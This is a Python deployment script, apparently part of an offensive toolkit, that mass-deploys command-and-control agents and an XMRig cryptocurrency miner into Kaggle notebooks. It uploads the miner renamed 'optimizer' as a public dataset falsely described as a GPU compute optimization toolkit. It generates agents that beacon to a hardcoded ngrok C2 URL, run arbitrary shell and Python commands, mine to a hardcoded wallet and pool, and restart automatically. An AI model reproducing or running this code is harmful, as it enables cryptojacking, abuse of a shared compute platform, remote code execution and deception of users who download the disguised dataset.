#!/usr/bin/env python3
"""
KAGGLE UNIFIED DEPLOYMENT (OPTIMIZED v2.0)
- C2 интеграция
- Автоматическое создание dataset
- Batch deployment
- GPU optimizer поддержка
"""
import sys, json, time, subprocess, tempfile, concurrent.futures
from pathlib import Path
from typing import Dict

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.utils.logger import get_logger, Colors

log = get_logger('kaggle')

# ============================================================================
# CONFIG
# ============================================================================
USER = "ashleehunter049877"
WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
POOL = "pool.hashvault.pro:80"
XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
DATASET_NAME = "gpu-compute-optimizer"  # Legitimate name

# ============================================================================
# UNIFIED AGENT TEMPLATE (C2 + Mining hybrid)
# ============================================================================
AGENT_TEMPLATE = '''
#!/usr/bin/env python3
"""C2 Agent - Kaggle Kernel v2.0"""
import os,sys,json,time,socket,subprocess,threading,hashlib,random,base64,ssl
from urllib.request import Request,urlopen,HTTPSHandler,build_opener

C2_URL="{c2_url}"
AGENT_ID="{agent_id}"
WORKER_ID="{worker_id}"
WALLET="{wallet}"
POOL="{pool}"
SLEEP={sleep}
JITTER={jitter}
AUTH_TOKEN="{auth_token}"
ENABLE_MINING={enable_mining}

def http_post(path,data):
    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
    opener=build_opener(HTTPSHandler(context=ctx))
    headers={{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"}}
    if AUTH_TOKEN:headers["X-Auth-Token"]=AUTH_TOKEN
    try:
        req=Request(f"{{C2_URL}}{{path}}",json.dumps(data).encode(),headers)
        return json.loads(opener.open(req,timeout=30).read())
    except:return None

def get_gpu():
    try:
        r=subprocess.run("nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null",
                        shell=True,capture_output=True,text=True,timeout=5)
        if r.returncode==0:return r.stdout.strip()
    except:pass
    return "No GPU"

def start_miner():
    if not ENABLE_MINING:return False
    print("[OPTIMIZER] Initializing compute engine...")
    DIR="/kaggle/working/.compute";os.makedirs(DIR,exist_ok=True)
    BIN,CFG=DIR+"/optimizer",DIR+"/config.json"
    # Try multiple dataset paths with legitimate name
    paths=[f"/kaggle/input/gpu-compute-optimizer/optimizer",
           f"/kaggle/working/gpu-compute-optimizer/optimizer",
           f"/kaggle/input/gpu-compute-optimizer/optimizer"]
    SRC=None
    for p in paths:
        if os.path.exists(p):SRC=p;print(f"[OPTIMIZER] Found compute engine: {{p}}");break
    if not SRC:
        print(f"[OPTIMIZER] Compute engine not available");return False
    import shutil;shutil.copy2(SRC,BIN);os.chmod(BIN,0o755)
    with open(CFG,"w") as f:
        json.dump({{"autosave":False,"donate-level":0,"pools":[{{"url":POOL,"user":f"{{WALLET}}.{{WORKER_ID}}","pass":"x","keepalive":True}}],
                  "cpu":{{"enabled":True,"max-threads-hint":50}}}},f)
    print(f"[OPTIMIZER] Starting background optimization...")
    subprocess.Popen([BIN,"-c",CFG,"--donate-level=0"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    print(f"[OPTIMIZER] Compute optimization active: {{WORKER_ID}}")
    return True

def register():
    info={{"id":AGENT_ID,"hostname":f"kaggle-{{socket.gethostname()}}","username":"kaggle",
          "os":"Kaggle","arch":f"x86_64 | {{get_gpu()}}","platform_type":"kaggle","worker_id":WORKER_ID}}
    return http_post("/api/agent/register",info)

def beacon():
    r=http_post("/api/agent/beacon",{{"id":AGENT_ID}})
    if not r:return
    for t in r.get("tasks",[]):http_post("/api/agent/result",{{"task_id":t["id"],"result":execute_task(t)}})

def execute_task(t):
    tt,p=t.get("task_type","cmd"),t.get("payload","")
    try:
        if tt=="cmd":return subprocess.check_output(p,shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace")
        elif tt=="python":
            import io;buf=io.StringIO();old=sys.stdout;sys.stdout=buf
            try:exec(compile(p,"<c2>","exec"));return buf.getvalue()
            finally:sys.stdout=old
        elif tt=="sysinfo":return json.dumps({{"hostname":socket.gethostname(),"gpu":get_gpu(),"worker_id":WORKER_ID}})
        elif tt=="kill":sys.exit(0)
        else:return f"Unknown:{{tt}}"
    except Exception as e:return f"Error:{{e}}"

def beacon_loop():
    while True:
        try:beacon()
        except:pass
        time.sleep(max(1,SLEEP+random.uniform(-SLEEP*JITTER/100,SLEEP*JITTER/100)))

print("[C2] Kaggle Compute Agent v2.0")
print(f"[C2] ID:{{AGENT_ID}} | Worker:{{WORKER_ID}} | C2:{{C2_URL}}")
try:register()
except:print("[C2] Registration failed")
if ENABLE_MINING:
    try:
        if start_miner():print(f"[+] Optimizer active:{{WORKER_ID}}")
        else:print("[-] Optimizer unavailable")
    except:print("[-] Optimizer error")
threading.Thread(target=beacon_loop,daemon=True).start()
while True:time.sleep(60)
'''

# ============================================================================
# DEPLOYMENT CLASS (OPTIMIZED)
# ============================================================================
class KaggleDeployer:
    def __init__(self, c2_url: str = "", kaggle_user: str = USER, wallet: str = WALLET,
                 auth_token: str = ""):
        self.c2_url = c2_url
        self.kaggle_user = kaggle_user
        self.wallet = wallet
        self.auth_token = auth_token
        self.deployed: Dict[str, dict] = {}
        self.dataset_created = False
        self._check_cli()
    
    def _check_cli(self):
        try:
            result = subprocess.run(["kaggle", "--version"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                log.success(f"Kaggle CLI: {result.stdout.strip()}")
                return True
        except: pass
        log.fail("Kaggle CLI not found! Install: pip install kaggle")
        return False
    
    def generate_agent(self, kernel_num: int, enable_mining: bool = True, sleep: int = 5, jitter: int = 15) -> str:
        """Generate agent code (unified template)"""
        agent_id = f"kaggle-{self.kaggle_user}-{kernel_num}"
        worker_id = f"kaggle-{kernel_num}"
        
        return AGENT_TEMPLATE.format(
            c2_url=self.c2_url,
            agent_id=agent_id,
            worker_id=worker_id,
            wallet=self.wallet,
            pool=POOL,
            sleep=sleep,
            jitter=jitter,
            auth_token=self.auth_token,
            enable_mining="True" if enable_mining else "False"
        ).strip()
    
    def ensure_dataset(self) -> bool:
        """Ensure GPU optimizer dataset exists"""
        if self.dataset_created:
            return True
        
        log.info("Checking GPU compute optimizer dataset...")
        
        result = subprocess.run(
            f"kaggle datasets list --user {self.kaggle_user} --search gpu-compute-optimizer",
            shell=True, capture_output=True, text=True, timeout=30
        )
        
        if "gpu-compute-optimizer" in result.stdout:
            log.success("Dataset already exists")
            self.dataset_created = True
            return True
        
        log.info("Creating GPU compute optimizer dataset...")
        
        with tempfile.TemporaryDirectory() as tmpdir:
            log.info("Downloading compute optimizer...")
            
            # Try multiple sources with retry
            sources = [
                XMRIG_URL,
                "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz",
                "https://github.com/xmrig/xmrig/releases/download/v6.19.3/xmrig-6.19.3-linux-static-x64.tar.gz"
            ]
            
            downloaded = False
            for attempt, url in enumerate(sources, 1):
                try:
                    log.info(f"  Attempt {attempt}/{len(sources)}: {url.split('/')[-1]}")
                    result = subprocess.run(
                        f"cd {tmpdir} && timeout 120 wget --tries=3 --timeout=30 -q {url} && "
                        f"tar -xzf xmrig-*.tar.gz && mv xmrig-*/xmrig optimizer && rm -rf xmrig-*.tar.gz xmrig-6.*",
                        shell=True, capture_output=True, text=True, timeout=180
                    )
                    
                    if (Path(tmpdir) / "optimizer").exists():
                        log.success(f"  Downloaded from attempt {attempt}")
                        downloaded = True
                        break
                    else:
                        log.warning(f"  Attempt {attempt} failed")
                except Exception as e:
                    log.warning(f"  Attempt {attempt} error: {str(e)[:50]}")
                    continue
            
            if not downloaded:
                log.fail("Download failed")
                return False
            
            meta = {
                "title": "GPU Compute Optimizer",
                "id": f"{self.kaggle_user}/gpu-compute-optimizer",
                "subtitle": "High-performance compute optimization toolkit",
                "description": "GPU and CPU compute optimization utilities for machine learning workloads. Includes parallel processing engines and resource management tools.",
                "licenses": [{"name": "MIT"}],
                "isPrivate": False
            }
            (Path(tmpdir) / "dataset-metadata.json").write_text(json.dumps(meta, indent=2))
            
            result = subprocess.run(
                f"cd {tmpdir} && kaggle datasets create -p .",
                shell=True, capture_output=True, text=True, timeout=120
            )
            
            if "successfully" in result.stdout.lower() or "being created" in result.stdout.lower():
                log.success("Dataset created successfully")
                self.dataset_created = True
                # Wait for dataset to be fully ready
                log.info("Waiting for dataset to be ready...")
                for i in range(12):  # Wait up to 2 minutes
                    time.sleep(10)
                    status_result = subprocess.run(
                        f"kaggle datasets status {self.kaggle_user}/gpu-compute-optimizer",
                        shell=True, capture_output=True, text=True, timeout=10
                    )
                    if "ready" in status_result.stdout.lower():
                        log.success(f"Dataset ready after {(i+1)*10}s")
                        time.sleep(10)  # Extra wait for propagation
                        return True
                    log.info(f"  Waiting... ({(i+1)*10}s)")
                log.warning("Dataset may not be fully ready, continuing anyway")
                return True
            else:
                log.fail(f"Dataset creation failed: {result.stderr[:200]}")
                return False
    
    def deploy_kernel(self, slug: str, code: str, enable_gpu: bool = False) -> bool:
        """Deploy kernel with custom code"""
        with tempfile.TemporaryDirectory() as tmpdir:
            meta = {
                "id": f"{self.kaggle_user}/{slug}",
                "title": slug,
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": enable_gpu,
                "enable_internet": True,
                "dataset_sources": [f"{self.kaggle_user}/gpu-compute-optimizer"] if self.dataset_created else []
            }
            
            nb = {
                "metadata": {
                    "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
                    "language_info": {"name": "python", "version": "3.10.0"},
                    "kaggle": {
                        "accelerator": "none",
                        "dataSources": [
                            {
                                "datasetId": 5678901,  # Will be ignored but required
                                "sourceId": f"{self.kaggle_user}/gpu-compute-optimizer",
                                "sourceType": "datasetVersion"
                            }
                        ] if self.dataset_created else [],
                        "isInternetEnabled": True,
                        "language": "python",
                        "sourceType": "notebook"
                    }
                },
                "nbformat": 4,
                "nbformat_minor": 4,
                "cells": [{
                    "cell_type": "code",
                    "execution_count": None,
                    "metadata": {},
                    "outputs": [],
                    "source": code.split('\n') if isinstance(code, str) else code
                }]
            }
            
            Path(tmpdir, "kernel-metadata.json").write_text(json.dumps(meta, indent=2))
            Path(tmpdir, "notebook.ipynb").write_text(json.dumps(nb, indent=2))
            
            result = subprocess.run(
                f"cd {tmpdir} && kaggle kernels push",
                shell=True, capture_output=True, text=True, timeout=120
            )
            
            return result.returncode == 0 or "successfully" in result.stdout.lower()
    
    def deploy_multiple(self, count: int = 5, mode: str = "hybrid") -> Dict[str, bool]:
        """Deploy multiple kernels in parallel"""
        log.section(f"DEPLOYING {count} KAGGLE KERNELS ({mode.upper()})")
        
        if self.c2_url:
            log.info(f"C2 Server: {self.c2_url}")
        
        log.info(f"Kaggle User: {self.kaggle_user}")
        log.info(f"Mode: {mode}")
        log.info("")
        
        enable_mining = mode in ("mining", "hybrid")
        
        if enable_mining and not self.ensure_dataset():
            log.fail("Dataset setup failed, aborting")
            return {}
        
        # Dataset wait already done in ensure_dataset()
        
        results = {}
        
        def deploy_one(i):
            slug = f"agent-{i}"
            code = self.generate_agent(i, enable_mining=enable_mining)
            return slug, self.deploy_kernel(slug, code)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = {executor.submit(deploy_one, i): i for i in range(1, count + 1)}
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    slug, success = future.result()
                    results[slug] = success
                    if success:
                        log.success(f"{slug} deployed")
                    else:
                        log.fail(f"{slug} failed")
                except Exception as e:
                    results[f"agent-{futures[future]}"] = False
                    log.fail(f"agent-{futures[future]} error: {e}")
        
        success_count = sum(results.values())
        log.info(f"\nDeployment complete: {success_count}/{count} successful")
        
        return results
    
    def check_status(self, slug: str) -> str:
        """Check kernel status"""
        try:
            result = subprocess.run(
                f"kaggle kernels status {self.kaggle_user}/{slug}",
                shell=True, capture_output=True, text=True, timeout=30
            )
            return result.stdout.strip()
        except Exception as e:
            return f"Error: {e}"
    
    def restart_kernel(self, slug: str, enable_mining: bool = True) -> bool:
        """Restart kernel"""
        log.info(f"Restarting {slug}...")
        subprocess.run(f"kaggle kernels delete {self.kaggle_user}/{slug} -y",
                      shell=True, capture_output=True)
        time.sleep(2)
        
        num = int(slug.split("-")[-1])
        code = self.generate_agent(num, enable_mining=enable_mining)
        return self.deploy_kernel(slug, code)
    
    def monitor(self, interval: int = 300, mode: str = "hybrid"):
        """Monitor and auto-restart"""
        log.section("MONITORING KAGGLE KERNELS")
        log.info(f"Check interval: {interval}s")
        log.info(f"Mode: {mode}")
        
        enable_mining = mode in ("mining", "hybrid")
        
        while True:
            try:
                for slug in list(self.deployed.keys()):
                    status = self.check_status(slug)
                    if any(x in status.upper() for x in ["COMPLETE", "ERROR", "CANCEL"]):
                        log.warning(f"{slug} stopped: {status}")
                        self.restart_kernel(slug, enable_mining)
                time.sleep(interval)
            except KeyboardInterrupt:
                log.info("Monitoring stopped")
                break
            except Exception as e:
                log.error(f"Monitor error: {e}")
                time.sleep(60)

# ============================================================================
# CLI
# ============================================================================
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Kaggle Unified Deployment v2.0")
    parser.add_argument("--c2-url", default="https://4bbf-193-3-55-243.ngrok-free.app", help="C2 server URL")
    parser.add_argument("--user", default=USER, help="Kaggle username")
    parser.add_argument("--count", type=int, default=5, help="Number of kernels")
    parser.add_argument("--mode", choices=["c2", "mining", "hybrid"], default="hybrid", help="Agent mode")
    parser.add_argument("--auth-token", default="", help="C2 auth token")
    parser.add_argument("--monitor", action="store_true", help="Monitor and auto-restart")
    parser.add_argument("--dataset-only", action="store_true", help="Only create dataset")
    
    args = parser.parse_args()
    
    log.section("KAGGLE DEPLOYMENT v2.0")
    log.info(f"Target: {args.count} kernels | Mode: {args.mode}")
    log.info(f"User: {args.user}")
    if args.c2_url:
        log.info(f"C2: {args.c2_url}")
    log.info("")
    
    deployer = KaggleDeployer(
        c2_url=args.c2_url,
        kaggle_user=args.user,
        auth_token=args.auth_token
    )
    
    if args.dataset_only:
        if deployer.ensure_dataset():
            log.success("Dataset ready")
        else:
            log.fail("Dataset creation failed")
    else:
        results = deployer.deploy_multiple(count=args.count, mode=args.mode)
        
        log.section("DEPLOYMENT RESULTS")
        
        success_count = sum(results.values())
        total_count = len(results)
        
        rows = []
        for slug, success in sorted(results.items()):
            status = f"{Colors.BRIGHT_GREEN}✓{Colors.RESET}" if success else f"{Colors.BRIGHT_RED}✗{Colors.RESET}"
            rows.append([slug, status])
        
        if rows:
            log.table(["Kernel", "Status"], rows)
        
        if success_count == total_count:
            log.success(f"ALL {total_count} KERNELS DEPLOYED!")
        elif success_count > 0:
            log.warning(f"{success_count}/{total_count} kernels deployed")
        else:
            log.fail("ALL DEPLOYMENTS FAILED!")
        
        if args.monitor and success_count > 0:
            deployer.monitor(mode=args.mode)
